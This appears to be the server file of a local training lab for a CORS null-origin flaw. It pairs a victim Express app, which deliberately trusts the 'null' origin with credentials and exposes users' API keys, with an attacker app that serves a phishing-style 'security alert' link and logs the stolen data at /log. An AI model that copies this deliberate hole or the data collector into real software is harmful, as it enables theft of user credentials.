require("dotenv").config();

const fs = require("fs");
const path = require("path");
const https = require("https");
const http = require("http");

const express = require("express");
const session = require("express-session");
const mysql = require("mysql2/promise");

const victimApp = express();
const attackerApp = express();

const VP = Number(process.env.VICTIM_PORT || 3000);
const AP = Number(process.env.ATTACKER_PORT || 4000);

const pool = mysql.createPool({
    host: process.env.DB_HOST,
    port: Number(process.env.DB_PORT || 3306),
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_NAME
});

victimApp.use(express.urlencoded({ extended: true }));
victimApp.use(express.json());

attackerApp.use(express.urlencoded({ extended: true }));
attackerApp.use(express.json());

let notification = {
    id: 0,
    message: "",
    exploitUrl: ""
};

victimApp.set("etag", false);

const allowedOrigins = [
    "http://localhost:4000",
    "null"
];

victimApp.use((req, res, next) => {
    const origin = req.headers.origin;

    console.log(
        `[CORS] ${req.method} ${req.path} | Origin=${origin || "-"}`
    );

    if (allowedOrigins.includes(origin)) {
        res.setHeader(
            "Access-Control-Allow-Origin",
            origin
        );

        res.setHeader(
            "Access-Control-Allow-Credentials",
            "true"
        );
    }

    next();
});

victimApp.use(
    session({
        secret: "cors-null-origin-local-lab",
        resave: false,
        saveUninitialized: false,
        cookie: {
            httpOnly: true,
            sameSite: "none",
            secure: true,
            domain: "localhost"
        }
    })
);

victimApp.get("/", (req, res) => {
    res.redirect("/login");
});

victimApp.get("/login", (req, res) => {
    res.sendFile(
        path.join(__dirname, "public", "login.html")
    );
});

victimApp.post("/login", async (req, res) => {
    const {
        username,
        password
    } = req.body;

    try {
        const [rows] = await pool.execute(
            `
            SELECT id, username
            FROM users
            WHERE username = ?
            AND password = ?
            `,
            [username, password]
        );

        if (!rows.length) {
            return res
                .status(401)
                .send("Invalid username or password");
        }

        req.session.userId = rows[0].id;
        req.session.username = rows[0].username;

        console.log(
            `[AUTH] ${rows[0].username} logged in`
        );

        res.redirect("/account");

    } catch (e) {
        console.error(e);
        res.status(500).send("Database error");
    }
});

victimApp.get("/account", (req, res) => {
    if (!req.session.userId) {
        return res.redirect("/login");
    }

    res.sendFile(
        path.join(__dirname, "public", "victim.html")
    );
});

victimApp.get("/api/me", (req, res) => {

    if (!req.session.userId) {
        return res.status(401).json({
            error: "Not authenticated"
        });
    }

    res.json({
        username: req.session.username
    });
});

victimApp.get("/api/notification", (req, res) => {
    if (!req.session.userId) {
        return res
            .status(401)
            .json({
                error: "Not authenticated"
            });
    }

    res.setHeader(
        "Cache-Control",
        "no-store"
    );

    res.json(notification);
});

victimApp.get(
    "/api/accountDetails",
    async (req, res) => {

        res.setHeader(
            "Cache-Control",
            "no-store, no-cache, must-revalidate, private"
        );

        console.log(
            `[API] session userId = ${
                req.session.userId ?? "-"
            }`
        );

        if (!req.session.userId) {
            return res
                .status(401)
                .json({
                    error: "Not authenticated"
                });
        }

        try {
            const [rows] = await pool.execute(
                `
                SELECT username, email, api_key
                FROM users
                WHERE id = ?
                `,
                [req.session.userId]
            );

            if (!rows.length) {
                return res
                    .status(404)
                    .json({
                        error: "User not found"
                    });
            }

            res.json({
                username: rows[0].username,
                email: rows[0].email,
                apiKey: rows[0].api_key
            });

        } catch (e) {
            console.error(e);

            res.status(500).json({
                error: "Database error"
            });
        }
    }
);

attackerApp.get("/", (req, res) => {
    res.sendFile(
        path.join(__dirname, "public", "attacker.html")
    );
});

attackerApp.post("/send-exploit", (req, res) => {

    notification = {
        id: Date.now(),

        message:
            "Security alert: unusual activity was detected on your account.",

        exploitUrl:
            `http://localhost:${AP}/malicious.html`
    };

    console.log(
        "[ATTACKER] Local exploit notification queued"
    );

    res.json({
        ok: true
    });
});

attackerApp.get(
    "/malicious.html",
    (req, res) => {

        res.sendFile(
            path.join(
                __dirname,
                "public",
                "malicious.html"
            )
        );
    }
);

attackerApp.get("/log", (req, res) => {

    const data = String(
        req.query.data || ""
    );

    console.log(
        "\n========== LAB RESULT ==========\n" +
        data +
        "\n===============================\n"
    );

    res.send(`
        <!doctype html>

        <meta charset="utf-8">

        <title>Lab Result</title>

        <style>
            body {
                font-family: Arial;
                max-width: 900px;
                margin: 40px auto;
            }

            pre {
                background: #f4f4f4;
                padding: 16px;
                white-space: pre-wrap;
            }
        </style>

        <h1>Exploit result</h1>

        <p>
            Local attacker server received
            the lab response.
        </p>

        <pre>${esc(data)}</pre>
    `);
});

function esc(s) {
    return s
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#039;");
}

(async () => {

    try {

        await pool.query("SELECT 1");

        console.log(
            "[+] MySQL connection OK"
        );

        const key = path.join(
            __dirname,
            "certs",
            "localhost+2-key.pem"
        );

        const cert = path.join(
            __dirname,
            "certs",
            "localhost+2.pem"
        );

        if (
            !fs.existsSync(key) ||
            !fs.existsSync(cert)
        ) {
            throw new Error(
                "Missing certs. Put localhost+2.pem and localhost+2-key.pem in lab/certs."
            );
        }

        https
            .createServer(
                {
                    key: fs.readFileSync(key),
                    cert: fs.readFileSync(cert)
                },
                victimApp
            )
            .listen(VP, () => {

                console.log(
                    `[+] Victim: https://localhost:${VP}`
                );

            });

        http
            .createServer(attackerApp)
            .listen(AP, () => {

                console.log(
                    `[+] Attacker: http://localhost:${AP}`
                );

            });

    } catch (e) {

        console.error(
            "[FATAL]",
            e.message
        );

        process.exit(1);
    }

})();